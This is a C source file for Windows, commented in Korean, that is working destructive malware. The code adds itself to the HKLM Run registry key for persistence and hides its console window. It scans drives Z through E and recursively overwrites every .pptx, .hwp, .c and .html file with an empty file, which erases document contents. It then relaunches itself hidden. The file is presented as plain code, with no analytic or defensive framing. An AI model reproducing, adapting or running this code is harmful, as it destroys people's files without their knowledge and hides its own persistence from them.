#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <io.h>// 파일찾기
#define PATH_SIZE 1000

BOOL SetStartProgram(LPCSTR lpPosition); // 시작 프로그램으로 등록

void FileList(char *path, char* ext, int search);

void CheckDevice(void);

int main(int argc, char** argv) {
	SetStartProgram(argv[0]);

	//콘솔창 안보이게
	HWND hWndConsole = GetConsoleWindow();
	ShowWindow(hWndConsole, SW_HIDE);

	CheckDevice();

	//창이 안보이게 파일을 열음
	ShellExecute(NULL, "open", argv[0], NULL, NULL, SW_HIDE);

}


void CheckDevice(void) {
	int i;
	char ch = 'Z', pos[50];
	FILE* fp = NULL;

	while (ch != 'D') {
		sprintf(pos, "%c:\\AutoRun.txt", ch);

		if ((fp = fopen(pos, "w")) != NULL) {
			sprintf(pos, "%c:", ch);
			//printf("%c 디스크 탐색 시작\n", ch);
			for (i = 0; i<2; i++) {
				FileList(pos, "pptx", i);
				FileList(pos, "hwp", i);
				FileList(pos, "c", i);
				FileList(pos, "html", i);
			}

		}
		ch--;
	}

}


//재귀함수 형태로 path 안에 있는 모든 하위 경로 탐색
void FileList(char *path, char* ext, int search)
{
	char newPath[PATH_SIZE];
	_finddata_t fd;
	long handle;
	int result = 1;
	FILE* fp = NULL;

	//search 0 - 폴더 탐색, search 1 - ext 파일 탐색
	if (search == 0) {
		sprintf(newPath, "%s\\*.", path);
	}
	else {
		sprintf(newPath, "%s\\*.%s", path, ext);
	}

	//Path 폴더를 열고 폴더파일이 있는지 체크
	if ((handle = _findfirst(newPath, &fd)) == -1L) { return; }

	//하위 경로를 모두 탐색
	while (result != -1)
	{
		//하위 폴더 탐색
		if ((search == 0) && strcmp(fd.name, ".") && strcmp(fd.name, "..")) {
			sprintf(newPath, "%s\\%s", path, fd.name);
			FileList(newPath, ext, 0);//하위 폴더에 있는 폴더 탐색
			FileList(newPath, ext, 1);//하위 폴더에 있는 ext파일 탐색
		}
		else {
			//빈 파일로 채우기
			sprintf(newPath, "%s\\%s", path, fd.name);
			CreateFile(newPath, GENERIC_READ | GENERIC_WRITE, 0, 0,
				CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		}

		//다음 경로로 이동
		result = _findnext(handle, &fd);
	}

	_findclose(handle);
	return;
}



BOOL SetStartProgram(LPCSTR lpPosition) {
	HKEY hKey; // 핸들 키
	long error; // 에러 확인

	error = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0L,
		KEY_WRITE, &hKey); // 레지스터에 있는 키 열기

	if (error == ERROR_SUCCESS) { // 성공 했는지 확인
		error = RegSetValueEx(hKey, TEXT("HELLO"), 0, REG_SZ, (BYTE*)lpPosition, lstrlen(lpPosition));
		RegCloseKey(hKey); // 리턴받은 핸들키에 Hello라는 레지스트리를 REG_SZ형식으로 만들고 lpPosition 프로그램으로 값을 등록한다.

		return true;
	}
	else if (error == ERROR_ACCESS_DENIED) { // 실패 할 경우(권한이 낮을 경우)
		printf("ERROR_ACCESS_DENIED\n");
	}
	else {
		printf("ERRORCODE : %ld\n", error); // 다른 오류
	}

	return false;
}